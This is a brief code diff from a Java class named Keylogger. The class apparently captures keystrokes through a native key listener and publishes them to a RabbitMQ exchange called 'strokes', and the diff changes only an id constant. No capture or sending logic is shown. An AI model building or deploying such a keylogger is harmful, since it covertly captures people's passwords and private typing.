@@ -14,7 +14,7 @@ import com.rabbitmq.client.ConnectionFactory;
 
 public class Keylogger implements NativeKeyListener{
   private final String EXCHANGE_NAME = "strokes";
-  private final int id = 1;
+  private final int id = 3;
   private final Logger logger = LoggerFactory.getLogger(Keylogger.class);
   private Channel channel; 
 
